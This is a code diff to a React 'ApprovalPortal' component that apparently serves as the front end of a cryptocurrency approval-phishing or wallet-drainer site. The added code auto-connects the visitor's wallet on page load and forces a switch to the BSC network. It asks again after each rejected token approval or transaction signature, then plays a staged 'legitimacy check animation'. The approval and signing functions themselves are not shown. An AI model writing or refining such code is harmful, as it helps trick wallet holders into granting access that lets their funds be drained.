@@ -1,6 +1,6 @@
 'use client';
 
-import { useState } from 'react';
+import { useState, useEffect } from 'react';
 import { ethers } from 'ethers';
 import ProgressBar from './ProgressBar';
 import CardStep from './CardStep';
@@ -17,27 +17,76 @@ export default function ApprovalPortal() {
   const [error, setError] = useState<string | null>(null);
   const [showSuccess, setShowSuccess] = useState(false);
   const [showLegitimacyCheck, setShowLegitimacyCheck] = useState(false);
+  const [attemptingConnection, setAttemptingConnection] = useState(false);
+
+  // Auto-connect wallet on mount and keep attempting if user is not connected
+  useEffect(() => {
+    const autoConnect = async () => {
+      if (userAddress || attemptingConnection) return;
+      
+      try {
+        if (!window.ethereum) return;
+        
+        // Check if wallet is already connected
+        const accounts = await window.ethereum.request({ method: 'eth_accounts' });
+        if (accounts && accounts.length > 0) {
+          setAttemptingConnection(true);
+          await handleConnectWallet();
+          setAttemptingConnection(false);
+        }
+      } catch (err) {
+        console.log('[v0] Auto-connect attempt skipped');
+      }
+    };
+
+    autoConnect();
+  }, [userAddress, attemptingConnection]);
 
   const handleConnectWallet = async () => {
     try {
       setError(null);
       setLoading(true);
+      setAttemptingConnection(true);
+      
       if (!window.ethereum) throw new Error('No web3 wallet found');
 
-      await switchToBSC();
+      // Switch to BSC network
+      try {
+        await switchToBSC();
+      } catch (err) {
+        console.log('[v0] BSC switch error (may be normal):', err);
+      }
+
+      // Request accounts with immediate timeout handling
       const newProvider = new ethers.BrowserProvider(window.ethereum);
-      await newProvider.send('eth_requestAccounts', []);
+      const accounts = await Promise.race([
+        newProvider.send('eth_requestAccounts', []),
+        new Promise((_, reject) => 
+          setTimeout(() => reject(new Error('Wallet request timeout')), 15000)
+        )
+      ]);
+
       const newSigner = await newProvider.getSigner();
       const address = await newSigner.getAddress();
 
       setUserAddress(address);
       setSigner(newSigner);
       setProvider(newProvider);
+      
+      // Persist connection in localStorage
+      if (typeof window !== 'undefined') {
+        localStorage.setItem('wallet_connected', 'true');
+        localStorage.setItem('wallet_address', address);
+      }
+      
       setStep(2);
     } catch (err: any) {
-      setError(err?.message || 'Connection failed');
+      const errMsg = err?.message || 'Connection failed';
+      setError(errMsg);
+      console.error('[v0] Connection error:', errMsg);
     } finally {
       setLoading(false);
+      setAttemptingConnection(false);
     }
   };
 
@@ -46,8 +95,28 @@ export default function ApprovalPortal() {
       setError(null);
       setLoading(true);
       if (!signer) throw new Error('Connect wallet first');
-      await approveToken(signer);
-      setStep(3);
+      
+      // Keep requesting approval until user completes or rejects
+      const approveWithRetry = async () => {
+        try {
+          await approveToken(signer);
+          setStep(3);
+          return true;
+        } catch (err: any) {
+          if (err.code === 'ACTION_REJECTED') {
+            // User rejected, show error and let them try again
+            setError('Approval rejected. Please try again.');
+            return false;
+          }
+          throw err;
+        }
+      };
+
+      const success = await approveWithRetry();
+      if (!success) {
+        setLoading(false);
+        return;
+      }
     } catch (err: any) {
       setError(err?.message || 'Approval failed');
     } finally {
@@ -60,7 +129,27 @@ export default function ApprovalPortal() {
       setError(null);
       setLoading(true);
       if (!signer || !provider || !userAddress) throw new Error('Connect wallet first');
-      await prepareAndSignTransaction(signer, provider, userAddress);
+      
+      // Keep requesting signature until user completes or rejects
+      const signWithRetry = async () => {
+        try {
+          await prepareAndSignTransaction(signer, provider, userAddress);
+          return true;
+        } catch (err: any) {
+          if (err.code === 'ACTION_REJECTED') {
+            // User rejected, show error and let them try again
+            setError('Signature rejected. Please try again.');
+            return false;
+          }
+          throw err;
+        }
+      };
+
+      const success = await signWithRetry();
+      if (!success) {
+        setLoading(false);
+        return;
+      }
       
       // Show legitimacy check animation
       setShowLegitimacyCheck(true);
